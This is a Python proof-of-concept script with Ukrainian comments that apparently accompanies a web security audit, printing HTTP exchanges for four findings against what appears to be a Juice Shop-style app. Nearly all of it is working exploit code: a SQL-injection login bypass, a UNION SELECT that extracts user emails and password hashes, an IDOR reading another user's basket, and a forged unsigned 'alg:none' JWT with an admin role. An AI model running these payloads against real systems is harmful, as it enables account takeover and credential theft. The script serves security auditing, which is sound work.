#!/usr/bin/env python3
"""Показ HTTP-обміну для ключових PoC (аналог вкладки Request/Response у Burp Repeater).
Токени та хеші паролів маскуються. Використання: python3 poc/http_exchange.py <BASE> <F-01|F-02|F-04|F-13>"""
import base64, json, re, sys, uuid
import requests, urllib3

urllib3.disable_warnings()
BASE, CASE = sys.argv[1].rstrip('/'), sys.argv[2]
S = requests.Session(); S.verify = False
MASK = lambda t: re.sub(r'eyJ[\w-]+\.[\w-]+\.[\w-]*', '<JWT приховано>', re.sub(r'\b[0-9a-f]{32}\b', '<md5 приховано>', t))


def show(r, limit=420):
    q = r.request
    print(f'\033[36m>>> {q.method} {q.path_url} HTTP/1.1\033[0m')
    for h in ('Content-Type', 'Authorization'):
        if h in q.headers:
            print(f'\033[36m>>> {h}: {MASK(q.headers[h])}\033[0m')
    if q.body:
        print(f'\033[36m>>> {q.body.decode() if isinstance(q.body, bytes) else q.body}\033[0m')
    print(f'\033[33m<<< HTTP/1.1 {r.status_code} {r.reason}\033[0m')
    print('<<< ' + MASK(r.text)[:limit] + (' …' if len(r.text) > limit else '') + '\n')


def user():
    e = f'poc_{uuid.uuid4().hex[:5]}@test.local'; p = 'Audit-Pass-2026!'
    S.post(f'{BASE}/api/Users', json={'email': e, 'password': p, 'passwordRepeat': p, 'securityQuestion': {'id': 1}, 'securityAnswer': 'a'})
    return S.post(f'{BASE}/rest/user/login', json={'email': e, 'password': p}).json()['authentication']


if CASE == 'F-01':
    show(S.post(f'{BASE}/rest/user/login', json={'email': "' OR 1=1--", 'password': 'any'}))
elif CASE == 'F-02':
    show(S.get(f'{BASE}/rest/products/search', params={'q': "qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9','10' FROM Users--"}), 600)
elif CASE == 'F-04':
    a, b = user(), user()
    show(S.get(f"{BASE}/rest/basket/{b['bid']}", headers={'Authorization': f"Bearer {a['token']}"}), 300)
elif CASE == 'F-13':
    b64 = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
    tok = b64({'alg': 'none', 'typ': 'JWT'}) + '.' + b64({'data': {'id': 1, 'email': 'forged@evil.test', 'role': 'admin'}}) + '.'
    print('Підроблений токен: header={"alg":"none"} payload={"data":{"role":"admin",...}} signature=""')
    show(S.get(f'{BASE}/rest/user/authentication-details', headers={'Authorization': f'Bearer {tok}'}), 300)
